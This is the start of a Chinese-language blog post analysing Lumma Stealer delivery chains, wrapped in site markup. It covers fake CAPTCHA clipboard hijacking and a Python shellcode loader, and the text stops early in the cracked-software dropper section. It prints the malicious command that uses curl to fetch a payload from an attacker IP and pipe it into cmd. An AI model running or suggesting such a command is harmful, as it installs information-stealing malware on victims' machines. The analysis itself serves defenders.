25.36 27.42 25.56 Q 27.12 25.76 26.8 25.76 Z M 33.2 9.84 Q 32.28 9.84 32.28 9.16 Q 32.28 8.68 32.8 8.12 Q 33.32 7.56 34.32 7.32 Q 34.92 7.16 35.3 7.14 Q 35.68 7.12 36.04 7 Q 35.88 7.76 35.38 8.64 Q 34.88 9.52 34.08 9.72 Q 33.68 9.84 33.2 9.84 Z" data-astro-cid-cagdmauf></path> </g> </svg> </div> </a>  <nav class="flex items-center gap-4.8 w-full lt-md:justify-end
    justify-end" aria-label="Main menu">  <div class="grid grid-flow-col items-center gap-4.8 print:op-0
              false
              "> <a class="op-60 no-underline hover:op-100 lt-md:hidden op-50! op-transition" href="/nicky.cool/blog/" title="Blog" aria-label="Blog" aria-current="false">  <span>Blog</span></a><a class="op-60 no-underline hover:op-100 lt-md:hidden op-50! op-transition" href="/nicky.cool/projects/" title="Projects" aria-label="Projects" aria-current="false">  <span>Projects</span></a><a class="op-60 no-underline hover:op-100 lt-md:hidden op-50! op-transition" href="/nicky.cool/shorts/" title="Shorts" aria-label="Shorts" aria-current="false">  <div class="i-meteor-icons-grid"></div></a><hr class="w-0.25 h-[85%] b-t-0 bg-[#ddd] dark:bg-[#333] lt-md:hidden" aria-hidden="true"><a class="op-60 no-underline hover:op-100 lt-md:hidden op-50! op-transition" href="https://github.com/nickyl07" title="Github" aria-label="Github" rel="me">  <div class="i-uil-github-alt"></div></a><a class="op-60 no-underline hover:op-100 lt-md:hidden op-50! op-transition" href="https://x.com/noknoku07_nok" title="Twitter" aria-label="Twitter" rel="me">  <div class="i-ri-twitter-x-fill"></div></a><hr class="w-0.25 h-[85%] b-t-0 bg-[#ddd] dark:bg-[#333] lt-md:hidden" aria-hidden="true"><!-- Search Switch --><button type="button" id="search-switch" class="op-60 hover:op-100 op-transition" title="Search" aria-label="Search"> <div u-i-grommet-icons-search></div> </button> <!-- Search Panel --> <search-panel role="dialog" id="search-panel" class="hidden z-200 fixed top-15% lt-lgp:top-10% left-50% translate-x--50%
    grid grid-rows-[auto_1fr_auto]
    w-42rem lt-lgp:w-90% max-h-70vh lt-lgp:max-h-80vh p-3 lt-lgp:pb-1 rounded-lg
    text-[var(--c-text)] bg-[var(--c-bg)] shadow-custom_0_0_10_0" aria-modal="true" aria-labelledby="search-label" aria-keyshortcuts="ArrowUp,ArrowDown,Enter,Esc" data-filter="true" data-batch-size="5" data-max-items="3"> <div class="flex flex-col gap-2"> <!-- Tab list --> <div role="tablist" class="search-tabs flex gap-2 justify-start items-center text-xs" aria-label="Search categories"> <button type="button" role="tab" class="px-1.5 py-0.5 rounded
                bg-[#88888816]! dark:bg-[#88888823]!
                aria-[selected=false]:op-40 aria-[selected=true]:op-100
                aria-[selected=false]:hover:op-70 op-transition cursor-pointer" data-type="blog"> Blog </button><button type="button" role="tab" class="px-1.5 py-0.5 rounded
                bg-[#88888816]! dark:bg-[#88888823]!
                aria-[selected=false]:op-40 aria-[selected=true]:op-100
                aria-[selected=false]:hover:op-70 op-transition cursor-pointer" data-type="projects"> Projects </button> </div> <!-- Search Bar --> <div class="grid grid-cols-[auto_1fr] items-center
        h-10 px-3 rounded-md
        bg-[#88888811] dark:bg-[#88888818]"> <div u-i-grommet-icons-search></div> <label for="search-input" id="search-label" class="sr-only"></label> <input type="search" role="combobox" id="search-input" class="h-full pl-2 bg-transparent outline-0" autocomplete="off" autocorrect="off" spellcheck="false" aria-labelledby="search-label" aria-autocomplete="list" aria-controls="search-results" aria-expanded="false"> </div> </div> <!-- Search Results --> <div role="listbox" id="search-results" class="overflow-y-auto my-1" aria-labelledby="search-input" tabindex="-1" data-base="/nicky.cool/"> <!-- Results --> <div id="search-content"></div> <!-- Feedback --> <div id="search-feedback" class="hidden py-3 text-center text-sm op-40"></div> <!-- Pagination --> <div id="search-pagination" style="display: none" class="items-center justify-center gap-4 pt-4 pb-3 text-xs"> <button class="flex items-center justify-center gap-1 op-40 hover:op-100 op-transition" data-action="more"> <div u-i-material-symbols-arrow-cool-down></div> <span></span> </button> <button class="flex items-center justify-center gap-1 op-40 hover:op-100 op-transition" data-action="all"> <div u-i-material-symbols-expand-all></div> <span></span> </button> </div> </div> <!-- Shortcuts Footer --> <footer role="note" aria-label="Keyboard shortcuts"> <ul class="flex flex-wrap items-center gap-4.5 lt-md:hidden
        pt-3 border-t border-[#7d7d7d4d]
        text-xs op-40 select-none"> <li class="flex items-center gap-1"> <kbd class="search-kbd-key"> <div u-i-material-symbols-arrow-upward></div> </kbd> <kbd class="search-kbd-key"> <div u-i-material-symbols-arrow-downward></div> </kbd> <span>Navigate</span> </li> <li class="flex items-center gap-1"> <kbd class="search-kbd-key"> <div u-i-grommet-icons-return></div> </kbd> <span>Go to Page</span> </li> <li class="flex items-center gap-1"> <kbd class="search-kbd-key">esc</kbd> <span>Close</span> </li> </ul> </footer> </search-panel> <script type="module" src="/nicky.cool/_astro/SearchSwitch.astro_astro_type_script_index_0_lang.ByiBzNYd.js"></script> <script type="module" src="/nicky.cool/_astro/SearchSwitch.astro_astro_type_script_index_1_lang.YoRIvrBK.js"></script> <!-- https://github.com/pagefind/pagefind/blob/production-docs/pagefind_web_js/types/index.d.ts --> <script>(function(){const scriptUrl = "/nicky.cool/pagefind/pagefind.js";
const navHighlight = true;

    async function loadPagefind() {
      const pagefind = await import(scriptUrl)

      // https://pagefind.app/docs/search-config/
      await pagefind.options({
        'excerptLength': 20,
        ...(navHighlight && {
          'highlightParam': 'search'
        }),

        // https://pagefind.app/docs/ranking/
        ranking: {
          termFrequency: 0.6,
          termSimilarity: 1.0,
          pageLength: 0.0,
          termSaturation: 1.4
        }
      })

      pagefind.init()
      window.pagefind = pagefind
    }

    if (!window.pagefind) loadPagefind()
  })();</script> <script>(function(){const scriptUrl = "/nicky.cool/pagefind/pagefind-highlight.js";

    async function loadPagefindHighlight() {
      await import(scriptUrl)

      const PagefindHighlight = window.PagefindHighlight
      if (!PagefindHighlight) return
      const pagefindHighlight = new PagefindHighlight({
        // https://pagefind.app/docs/highlight-config
        highlightParam: "search",
        markContext: "[data-pagefind-body]",
        markOptions: {
          // https://markjs.io/#mark
          className: "pagefind-highlight",
          exclude: ["[data-pagefind-ignore]", "[data-pagefind-ignore] *"],
        },
        addStyles: false,
      });

      window.pagefindHighlight = pagefindHighlight
    }

    if (!window.pagefindHighlight) loadPagefindHighlight()
  })();</script> <script type="module">document.addEventListener("astro:page-load",()=>{new URLSearchParams(location.search).has("search")&&pagefindHighlight.highlight()});</script><button id="theme-switch" class="op-60 hover:op-100 op-transition" title="Toggles light & dark" aria-label="Toggles light & dark"> <div u-i-ri-sun-line u-dark:i-ri-moon-line></div> </button> <!-- Initialize as inline scripts for faster response, avoiding FOUC  --> <script data-astro-rerun>
  function initTheme() {
    let theme
    if (typeof localStorage !== 'undefined' && localStorage.getItem('theme')) {
      theme = localStorage.theme
    } else {
      theme = window.matchMedia('(prefers-color-scheme: dark)').matches
        ? 'dark'
        : 'light'
      window.localStorage.setItem('theme', theme)
    }

    const toggleThemeButton = document.getElementById('theme-switch')
    toggleThemeButton.setAttribute('role', 'switch')

    if (theme === 'light') {
      document.documentElement.classList.remove('dark')
      toggleThemeButton.setAttribute('aria-label', 'light')
      toggleThemeButton.setAttribute('aria-checked', 'false')
    } else {
      document.documentElement.classList.add('dark')
      toggleThemeButton.setAttribute('aria-label', 'dark')
      toggleThemeButton.setAttribute('aria-checked', 'true')
    }

    const colorThemeMetaTag = document.querySelector("meta[name='theme-color']")
    const bgColor = getComputedStyle(document.body).getPropertyValue('--c-bg')
    colorThemeMetaTag?.setAttribute('content', bgColor)
  }

  initTheme()
</script> <script type="module">const p=()=>{const e=navigator.userAgentData;return e?.brands?.length&&e.brands.some(d=>/Chrom(e|ium)/i.test(d.brand))?"both":"none"},f=p();document.addEventListener("astro:page-load",()=>{let e;const c=t=>{const n=t?`${location.origin}/giscus/dark.css`:`${location.origin}/giscus/light.css`,o=document.getElementById("giscus-script");if(o){o.setAttribute("data-theme",n);const s=document.querySelector("iframe.giscus-frame");s&&s instanceof HTMLIFrameElement&&s.contentWindow&&s.contentWindow.postMessage({giscus:{setConfig:{theme:n}}},"https://giscus.app")}},r=t=>{t.setAttribute("aria-label",e?"dark":"light"),t.setAttribute("aria-checked",e?"true":"false")},d=()=>{const t=document.querySelector("meta[name='theme-color']"),n=getComputedStyle(document.body).getPropertyValue("--c-bg");t?.setAttribute("content",n)},u=()=>{window.localStorage.setItem("theme",e?"dark":"light")},g=t=>{const n=t.currentTarget,o=()=>{document.documentElement.classList.toggle("dark"),e=document.documentElement.classList.contains("dark"),c(e),r(n),d(),u()};if(!(document.startViewTransition&&!window.matchMedia("(prefers-reduced-motion: reduce)").matches)){o();return}const i=t.clientX,a=t.clientY,h=Math.hypot(Math.max(i,innerWidth-i),Math.max(a,innerHeight-a));document.startViewTransition(()=>o()).ready.then(()=>{const l=[`circle(0px at ${i}px ${a}px)`,`circle(${h}px at ${i}px ${a}px)`];document.documentElement.animate({clipPath:e?l.reverse():l},{duration:400,easing:"ease-out",fill:f,pseudoElement:e?"::view-transition-old(root)":"::view-transition-new(root)"})})},m=document.getElementById("theme-switch");m?.addEventListener("click",g),window.matchMedia("(prefers-color-scheme: dark)").addEventListener("change",({matches:t})=>{e=t,document.documentElement.classList.toggle("dark",e),c(e),m&&r(m),u()})});</script><a class="op-60 no-underline hover:op-100 op-transition lt-md:hidden" href="/nicky.cool/rss.xml" title="RSS Feed" aria-label="RSS Feed">   <div u-i-lucide-rss></div> </a> </div> <button id="nav-open-button" class="hidden lt-md:block op-60 hover:op-100 op-transition" title="Navigation" aria-label="Navigation" aria-expanded="false" aria-controls="nav-panel"> <div u-i-ri-menu-line></div> </button> <div id="nav-panel" class="hidden! z-200 fixed top-10% left-50% translate-x--50%
    overflow-y-auto flex flex-col gap-5
    w-90% max-h-80vh py-4 px-6 rounded-lg
  bg-[var(--c-bg)] shadow-custom_0_0_10_0 text-[var(--c-text)]"> <ul> <li class="block py-3 border-b b-[var(--c-scrollbar)] leading-6"><a class="op-60 no-underline hover:op-100 block op-50! op-transition" href="/nicky.cool/blog/" title="Blog" aria-label="Blog" aria-current="false">  <span>Blog</span></a></li><li class="block py-3 border-b b-[var(--c-scrollbar)] leading-6"><a class="op-60 no-underline hover:op-100 block op-50! op-transition" href="/nicky.cool/projects/" title="Projects" aria-label="Projects" aria-current="false">  <span>Projects</span></a></li><li class="block py-3 border-b b-[var(--c-scrollbar)] leading-6"><a class="op-60 no-underline hover:op-100 block op-50! op-transition" href="/nicky.cool/shorts/" title="Shorts" aria-label="Shorts" aria-current="false">  <span>Shorts</span></a></li> </ul> <div class="flex justify-center items-center gap-4"> <a class="op-60 no-underline hover:op-100 block op-50! op-transition" href="https://github.com/nickyl07" title="Github" aria-label="Github" rel="me">  <div class="i-uil-github-alt"></div></a><a class="op-60 no-underline hover:op-100 block op-50! op-transition" href="https://x.com/noknoku07_nok" title="Twitter" aria-label="Twitter" rel="me">  <div class="i-ri-twitter-x-fill"></div></a><a class="op-60 no-underline hover:op-100 op-transition op-50!" href="/nicky.cool/rss.xml" title="RSS Feed" aria-label="RSS Feed">   <div u-i-lucide-rss></div> </a>  </div> </div> <script type="module" src="/nicky.cool/_astro/NavSwitch.astro_astro_type_script_index_0_lang.lh05xrMp.js"></script> </nav> </header> <!-- Main --> <main id="main" class="px-7 py-10"> <!-- Content -->  <header class="prose mx-auto mb-8"> <h1>Lumma Stealer：从“剪贴板劫持”到“复杂多阶加载”的演进</h1>   <div class="mt--6! op-50"><time datetime="2026-01-25T00:00:00.000Z">2026年1月25日</time><span> · 10 min</span></div>  </header> <article class="slide-enter-content prose mx-auto" data-pagefind-body data-pagefind-filter="collection:blog"> <script type="module" src="/nicky.cool/_astro/TocButton.astro_astro_type_script_index_0_lang.CJR-4Jo8.js"></script><script type="module">class h extends HTMLElement{#n;#s;#i=null;#t=new Map;#o=null;#e=[];connectedCallback(){this.#c(()=>this.#l())}disconnectedCallback(){this.#f()}#l=()=>{this.#n=this.#h(this.dataset.minH),this.#s=this.#h(this.dataset.maxH);const t=this.#r("a",!1);this.#d(t);const e=this.#n&&this.#s?this.#r(this.#u(this.#n,this.#s)):this.#r(".toc-heading");this.#i=new IntersectionObserver(this.#a,{root:null,rootMargin:"0% 0% -75% 0%",threshold:0});for(const n of e)this.#i.observe(n)};#c=t=>(window.requestIdleCallback||(e=>setTimeout(e,1)))(t);#a=t=>{if(!t.length)return;let e=t[0];for(let o=1;o<t.length;o++)t[o].time>e.time&&(e=t[o]);const n=e.target;if(!n)return;const i=e.boundingClientRect.top>window.innerHeight/4?this.#g(this.#t,n):n;if(!i||i===this.#o)return;const r=this.#t.get(i)??[];if(this.#e&&this.#e.length)for(const o of this.#e)o.removeAttribute("aria-current");for(const o of r)o.setAttribute("aria-current","true"),o.scrollIntoView({behavior:"smooth",block:"center"});this.#o=i,this.#e=r};#h=t=>t?parseInt(t,10):void 0;#r=(t,e=!0)=>e?Array.from(document.querySelectorAll(t)):Array.from(this.querySelectorAll(t));#d=t=>{for(const e of t){const{hash:n}=new URL(e.href),s=decodeURIComponent(n.replace(/^#/,"")),i=document.getElementById(s);i&&(this.#t.has(i)?this.#t.get(i)?.push(e):this.#t.set(i,[e]))}};#u=(t,e,n="")=>{const s=[];for(let i=t;i<=e;i++)n?s.push(`${n} h${i}`):s.push(`h${i}`);return s.join(", ")};#g=(t,e)=>{let n=null;for(const s of t.keys()){if(s===e)return n;n=s}return null};#f=()=>{this.#i?.disconnect(),this.#i=null,this.#t.clear(),this.#o=null,this.#e=[]}}customElements.define("table-of-contents",h);</script><aside> <table-of-contents data-min-h="2" data-max-h="4"> <!-- Greater than or equal to 1128px --> <nav class="toc-desktop toc-desktop-content"> <div class="toc-desktop-anchor i-ri-menu-2-fill"></div> <ul> <li><a class="op-60 no-underline hover:op-100" href="#前言" aria-label="Scroll to 前言">  前言</a></li><li><a class="op-60 no-underline hover:op-100" href="#类型一社会工程学的极致kong-tuke与剪贴板劫持" aria-label="Scroll to 类型一：社会工程学的极致——“Kong Tuke”与剪贴板劫持">  类型一：社会工程学的极致——“Kong Tuke”与剪贴板劫持</a><ul><li><a class="op-60 no-underline hover:op-100" href="#1-入口虚假的verify-you-are-human" aria-label="Scroll to 1. 入口：虚假的“Verify You Are Human”">  1. 入口：虚假的“Verify You Are Human”</a></li><li><a class="op-60 no-underline hover:op-100" href="#2-载荷剪贴板中的恶意代码" aria-label="Scroll to 2. 载荷：剪贴板中的恶意代码">  2. 载荷：剪贴板中的恶意代码</a></li><li><a class="op-60 no-underline hover:op-100" href="#3-执行链分析" aria-label="Scroll to 3. 执行链分析">  3. 执行链分析</a></li></ul></li><li><a class="op-60 no-underline hover:op-100" href="#类型二复杂的白加黑与文件拼接假破解软件样本分析" aria-label="Scroll to 类型二：复杂的“白加黑”与文件拼接——假破解软件样本分析">  类型二：复杂的“白加黑”与文件拼接——假破解软件样本分析</a><ul><li><a class="op-60 no-underline hover:op-100" href="#1-初始执行伪装的-setupexe" aria-label="Scroll to 1. 初始执行：伪装的 Setup.exe">  1. 初始执行：伪装的 Setup.exe</a></li><li><a class="op-60 no-underline hover:op-100" href="#2-混淆核心指鹿为马的文件扩展名" aria-label="Scroll to 2. 混淆核心：指鹿为马的文件扩展名">  2. 混淆核心：指鹿为马的文件扩展名</a></li><li><a class="op-60 no-underline hover:op-100" href="#3-攻击链复盘基于残留日志" aria-label="Scroll to 3. 攻击链复盘（基于残留日志）">  3. 攻击链复盘（基于残留日志）</a></li><li><ul><li><a class="op-60 no-underline hover:op-100" href="#第一阶段环境侦察与反杀箱" aria-label="Scroll to 第一阶段：环境侦察与反杀箱">  第一阶段：环境侦察与反杀箱</a></li></ul></li><li><ul><li><a class="op-60 no-underline hover:op-100" href="#第二阶段文件拼接file-stitching" aria-label="Scroll to 第二阶段：文件拼接（File Stitching）">  第二阶段：文件拼接（File Stitching）</a></li></ul></li><li><ul><li><a class="op-60 no-underline hover:op-100" href="#第三阶段白利用加载autoit-loader" aria-label="Scroll to 第三阶段：白利用加载（AutoIt Loader）">  第三阶段：白利用加载（AutoIt Loader）</a></li></ul></li><li><a class="op-60 no-underline hover:op-100" href="#4-最终意图lumma-引导-sectoprat" aria-label="Scroll to 4. 最终意图：Lumma 引导 SectopRAT">  4. 最终意图：Lumma 引导 SectopRAT</a></li></ul></li><li><a class="op-60 no-underline hover:op-100" href="#总结与防御" aria-label="Scroll to 总结与防御">  总结与防御</a></li>  </ul> </nav> <!-- less than 1128px --> <button id="toc-open-button" class="z-50 fixed right-5 bottom-18
    w-10 h-10 rounded-full
    op-0 bg-#8883 dark:bg-#8886 pointer-events-none op-transition
    lt-lgp:op-50 lt-lgp:pointer-events-auto
    hover:op-100 print:hidden" title="Open table of contents"> <div u-i-lucide-table-of-contents class="text-gray-700 dark:text-gray-200"></div> </button> <nav id="toc-panel" class="hidden! z-200 fixed top-10% left-50% translate-x--50%
    overflow-y-auto flex flex-col
    w-90% max-h-80vh py-4 px-6 rounded-lg
    bg-[var(--c-bg)] shadow-custom_0_0_10_0 text-[var(--c-text)]"> <div class="pb-1 b-b b-[var(--c-text)]">Table of Contents</div> <ul class="text-sm"> <li><a class="op-60 no-underline hover:op-100" href="#前言" aria-label="Scroll to 前言">  前言</a></li><li><a class="op-60 no-underline hover:op-100" href="#类型一社会工程学的极致kong-tuke与剪贴板劫持" aria-label="Scroll to 类型一：社会工程学的极致——“Kong Tuke”与剪贴板劫持">  类型一：社会工程学的极致——“Kong Tuke”与剪贴板劫持</a><ul><li><a class="op-60 no-underline hover:op-100" href="#1-入口虚假的verify-you-are-human" aria-label="Scroll to 1. 入口：虚假的“Verify You Are Human”">  1. 入口：虚假的“Verify You Are Human”</a></li><li><a class="op-60 no-underline hover:op-100" href="#2-载荷剪贴板中的恶意代码" aria-label="Scroll to 2. 载荷：剪贴板中的恶意代码">  2. 载荷：剪贴板中的恶意代码</a></li><li><a class="op-60 no-underline hover:op-100" href="#3-执行链分析" aria-label="Scroll to 3. 执行链分析">  3. 执行链分析</a></li></ul></li><li><a class="op-60 no-underline hover:op-100" href="#类型二复杂的白加黑与文件拼接假破解软件样本分析" aria-label="Scroll to 类型二：复杂的“白加黑”与文件拼接——假破解软件样本分析">  类型二：复杂的“白加黑”与文件拼接——假破解软件样本分析</a><ul><li><a class="op-60 no-underline hover:op-100" href="#1-初始执行伪装的-setupexe" aria-label="Scroll to 1. 初始执行：伪装的 Setup.exe">  1. 初始执行：伪装的 Setup.exe</a></li><li><a class="op-60 no-underline hover:op-100" href="#2-混淆核心指鹿为马的文件扩展名" aria-label="Scroll to 2. 混淆核心：指鹿为马的文件扩展名">  2. 混淆核心：指鹿为马的文件扩展名</a></li><li><a class="op-60 no-underline hover:op-100" href="#3-攻击链复盘基于残留日志" aria-label="Scroll to 3. 攻击链复盘（基于残留日志）">  3. 攻击链复盘（基于残留日志）</a></li><li><ul><li><a class="op-60 no-underline hover:op-100" href="#第一阶段环境侦察与反杀箱" aria-label="Scroll to 第一阶段：环境侦察与反杀箱">  第一阶段：环境侦察与反杀箱</a></li></ul></li><li><ul><li><a class="op-60 no-underline hover:op-100" href="#第二阶段文件拼接file-stitching" aria-label="Scroll to 第二阶段：文件拼接（File Stitching）">  第二阶段：文件拼接（File Stitching）</a></li></ul></li><li><ul><li><a class="op-60 no-underline hover:op-100" href="#第三阶段白利用加载autoit-loader" aria-label="Scroll to 第三阶段：白利用加载（AutoIt Loader）">  第三阶段：白利用加载（AutoIt Loader）</a></li></ul></li><li><a class="op-60 no-underline hover:op-100" href="#4-最终意图lumma-引导-sectoprat" aria-label="Scroll to 4. 最终意图：Lumma 引导 SectopRAT">  4. 最终意图：Lumma 引导 SectopRAT</a></li></ul></li><li><a class="op-60 no-underline hover:op-100" href="#总结与防御" aria-label="Scroll to 总结与防御">  总结与防御</a></li> </ul> </nav>  </table-of-contents> </aside> <h2 id="前言">前言<a class="header-anchor" tab-index="0" aria-hidden="false" aria-label="Link to 前言" data-pagefind-ignore="" href="#前言">#</a></h2>
<p>Lumma Stealer（又名 LummaC2）是目前市场上最活跃的恶意软件即服务（MaaS）之一，其核心代码虽然保持稳定，但其投递（Delivery）和加载（Loading）机制却在不断进化。</p>
<p>通过对近期捕获的样本进行分析，我们观察到 Lumma 的攻击手法呈现出两种截然不同的流派：</p>
<ol>
<li><strong>社会工程学流派</strong>：利用“虚假人机验证”和 PowerShell 剪贴板劫持，绕过浏览器下载保护。</li>
<li><strong>复杂加载器流派</strong>：伪装成破解软件，利用 AutoIt 和文件拼接技术（File Stitching）进行深度混淆，甚至利用 <code>.mpg</code> 或 <code>.cda</code> 等多媒体文件后缀隐藏恶意代码。</li>
</ol>
<p>同时，Lumma Stealer属于典型的 <strong>Trojan-Spy（间谍木马）</strong> 家族。其核心特征在于“伪装”与“窃密”，而不像蠕虫那样通过网络自我复制，也不像勒索软件那样旨在破坏文件。</p>
<ol>
<li><strong>Trojan（木马伪装性）</strong>：通过社会工程学手段（如虚假验证码）或伪装成合法软件（如游戏破解补丁）进入受害者系统。</li>
<li><strong>Spy（间谍窃密性）</strong>：驻留内存，通过 API Hooking 和内存扫描窃取浏览器凭证、加密货币钱包等敏感信息。</li>
</ol>
<p>本文将结合具体捕获的样本，对 Lumma 目前主流的两种攻击链流派进行深入解构。</p>
<h2 id="类型一社会工程学的极致kong-tuke与剪贴板劫持">类型一：社会工程学的极致——“Kong Tuke”与剪贴板劫持<a class="header-anchor" tab-index="0" aria-hidden="false" aria-label="Link to 类型一：社会工程学的极致——“Kong Tuke”与剪贴板劫持" data-pagefind-ignore="" href="#类型一社会工程学的极致kong-tuke与剪贴板劫持">#</a></h2>
<p>这一类型的攻击不再依赖传统的“诱导下载并运行 EXE”，而是利用用户对“人机验证”的惯性思维，诱导用户通过系统自带工具（PowerShell）主动拉取病毒。</p>
<h3 id="1-入口虚假的verify-you-are-human">1. 入口：虚假的“Verify You Are Human”<a class="header-anchor" tab-index="0" aria-hidden="false" aria-label="Link to 1. 入口：虚假的“Verify You Are Human”" data-pagefind-ignore="" href="#1-入口虚假的verify-you-are-human">#</a></h3>
<p>攻击者入侵合法网站并注入恶意脚本（ <code>#KongTuke</code> 脚本）。当用户访问受损页面时，会弹出一个极其逼真的伪造 CAPTCHA 页面。</p>
<ul>
<li>
<p><strong>欺骗逻辑</strong>：页面提示用户通过图形验证，实则是一个覆盖全屏的 iframe。</p>
</li>
<li>
<p><strong>操作诱导</strong>：页面指示用户执行特定的“验证步骤”：</p>
<ol>
<li>按下 <code>Win + R</code>（打开运行窗口）。</li>
<li>按下 <code>Ctrl + V</code>（粘贴）。</li>
<li>按下 <code>Enter</code>（执行）。</li>
</ol>
<p><img alt="img" loading="lazy" decoding="async" fetchpriority="auto" sizes="(min-width: 1095px) 1095px, 100vw"  data-astro-image="constrained" width="1095" height="569" src="/nicky.cool/_astro/20260221221705206_aDtCy.webp" srcset="/nicky.cool/_astro/20260221221705206_EjmmV.webp 640w, /nicky.cool/_astro/20260221221705206_Z1BxAiM.webp 750w, /nicky.cool/_astro/20260221221705206_1JTFbx.webp 828w, /nicky.cool/_astro/20260221221705206_ZPcXEw.webp 1080w, /nicky.cool/_astro/20260221221705206_aDtCy.webp 1095w"></p>
</li>
</ul>
<h3 id="2-载荷剪贴板中的恶意代码">2. 载荷：剪贴板中的恶意代码<a class="header-anchor" tab-index="0" aria-hidden="false" aria-label="Link to 2. 载荷：剪贴板中的恶意代码" data-pagefind-ignore="" href="#2-载荷剪贴板中的恶意代码">#</a></h3>
<p>用户按下 <code>Ctrl + V</code> 时，粘贴的并非验证码，而是一段被脚本写入剪贴板的 PowerShell 命令：</p>
<div class="expressive-code"><link rel="stylesheet" href="/nicky.cool/_astro/ec.p1vpi.css"><script type="module" src="/nicky.cool/_astro/ec.p1z7b.js"></script><figure class="frame"><figcaption class="header"></figcaption><pre data-language="plaintext"><code><div class="ec-line"><div class="code"><span style="--0:#dbd7caee;--1:#393a34">cmd.exe /c start /min cmd /k "curl -s [http://85.209.129.105:2020/19](http://85.209.129.105:2020/19) | cmd &#x26;&#x26; exit"</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="cmd.exe /c start /min cmd /k &#x22;curl -s [http://85.209.129.105:2020/19](http://85.209.129.105:2020/19) | cmd &#x26;&#x26; exit&#x22;"><div></div></button></div></figure></div>
<p>这段代码直接调用 <code>curl</code> 从远程服务器拉取第二阶段的 Payload 并在内存中执行，完全绕过了浏览器的文件下载扫描。</p>
<p><img alt="img" loading="lazy" decoding="async" fetchpriority="auto" sizes="(min-width: 1095px) 1095px, 100vw"  data-astro-image="constrained" width="1095" height="569" src="/nicky.cool/_astro/20260221221709166_pzY2v.webp" srcset="/nicky.cool/_astro/20260221221709166_Z1shjGs.webp 640w, /nicky.cool/_astro/20260221221709166_1l2QqK.webp 750w, /nicky.cool/_astro/20260221221709166_ZmG0RQ.webp 828w, /nicky.cool/_astro/20260221221709166_ZAgtfz.webp 1080w, /nicky.cool/_astro/20260221221709166_pzY2v.webp 1095w"></p>
<h3 id="3-执行链分析">3. 执行链分析<a class="header-anchor" tab-index="0" aria-hidden="false" aria-label="Link to 3. 执行链分析" data-pagefind-ignore="" href="#3-执行链分析">#</a></h3>
<p>根据样本分析，PowerShell 脚本执行后会释放一个压缩包到 <code>%AppData%\Roaming</code> 下（例如名为 <code>FINAL</code> 的文件夹），其中包含核心组件：</p>
<ul>
<li><strong>Python 环境</strong>：一个微型的 Python 运行时。</li>
<li><strong>加载器 (<code>test.py</code> / <code>test.pyw</code>)</strong>：负责解密和加载 Shellcode。</li>
<li><strong>加密载荷 (<code>data.bin</code>)</strong>：真正的 Lumma Shellcode。</li>
</ul>
<p><img alt="img" loading="lazy" decoding="async" fetchpriority="auto" sizes="(min-width: 1095px) 1095px, 100vw"  data-astro-image="constrained" width="1095" height="1068" src="/nicky.cool/_astro/20260221221711789_lsELo.webp" srcset="/nicky.cool/_astro/20260221221711789_1zpjdd.webp 640w, /nicky.cool/_astro/20260221221711789_Z25SXqO.webp 750w, /nicky.cool/_astro/20260221221711789_hu8ip.webp 828w, /nicky.cool/_astro/20260221221711789_Z1wobuK.webp 1080w, /nicky.cool/_astro/20260221221711789_lsELo.webp 1095w"></p>
<p><strong>代码逻辑分析 (<code>test.pyw</code>)：</strong> 加载器使用 Python 的 <code>ctypes</code> 库直接调用 Windows API。</p>
<ol>
<li><strong>读取</strong>：打开 <code>data.bin</code> 并读取加密数据。</li>
<li><strong>解密</strong>：使用简单的 XOR 算法（如 <code>key = 0x3B</code>）在内存中还原 Shellcode。</li>
<li><strong>注入</strong>：调用 <code>kernel32.VirtualAlloc</code> 申请可执行内存（<code>0x40</code> PAGE_EXECUTE_READWRITE），使用 <code>RtlMoveMemory</code> (ctypes.memmove) 写入 Shellcode，最后通过 <code>ctypes.CFUNCTYPE</code> 创建函数指针并执行。</li>
</ol>
<p><img alt="image-20260124222940132" loading="lazy" decoding="async" fetchpriority="auto" sizes="(min-width: 1230px) 1230px, 100vw"  data-astro-image="constrained" width="1230" height="587" src="/nicky.cool/_astro/20260221221716267_x5GWB.webp" srcset="/nicky.cool/_astro/20260221221716267_Z296Vxy.webp 640w, /nicky.cool/_astro/20260221221716267_Z1is7Or.webp 750w, /nicky.cool/_astro/20260221221716267_IpGJ8.webp 828w, /nicky.cool/_astro/20260221221716267_Z1mtIgn.webp 1080w, /nicky.cool/_astro/20260221221716267_x5GWB.webp 1230w"></p>
<h2 id="类型二复杂的白加黑与文件拼接假破解软件样本分析">类型二：复杂的“白加黑”与文件拼接——假破解软件样本分析<a class="header-anchor" tab-index="0" aria-hidden="false" aria-label="Link to 类型二：复杂的“白加黑”与文件拼接——假破解软件样本分析" data-pagefind-ignore="" href="#类型二复杂的白加黑与文件拼接假破解软件样本分析">#</a></h2>
<p>第二类样本通常伪装成热门游戏或软件的破解补丁（如“PA25…Setup.zip”）。虽然由于样本捕获时 C2 已失活导致无法复现网络交互，但通过分析其遗留的<strong>安装脚本</strong>和<strong>中间文件</strong>，我们可以完整复盘其精妙的“多阶段加载”逻辑。</p>
<p><img alt="Screenshot showing multiple browser tabs open with various download links from websites, including Mega and DepositFiles, illustrating the path for the initial file from online to the victim machine." loading="lazy" decoding="async" fetchpriority="auto" sizes="(min-width: 2030px) 2030px, 100vw"  data-astro-image="constrained" width="2030" height="1386" src="/nicky.cool/_astro/20260221221718170_1mDLh0.webp" srcset="/nicky.cool/_astro/20260221221718170_zXENG.webp 640w, /nicky.cool/_astro/20260221221718170_Z1OhGCJ.webp 750w, /nicky.cool/_astro/20260221221718170_1UAUIk.webp 828w, /nicky.cool/_astro/20260221221718170_2vYd4J.webp 1080w, /nicky.cool/_astro/20260221221718170_Z26UJ4I.webp 1280w, /nicky.cool/_astro/20260221221718170_Z1Bu0KO.webp 1668w, /nicky.cool/_astro/20260221221718170_1mDLh0.webp 2030w"></p>
<h3 id="1-初始执行伪装的-setupexe">1. 初始执行：伪装的 Setup.exe<a class="header-anchor" tab-index="0" aria-hidden="false" aria-label="Link to 1. 初始执行：伪装的 Setup.exe" data-pagefind-ignore="" href="#1-初始执行伪装的-setupexe">#</a></h3>
<p>用户运行 <code>Setup.exe</code> 后，该程序实际上是一个 Dropper，它会在 <code>%TEMP%</code> 目录下释放大量文件名看似随机或具有误导性的文件。</p>
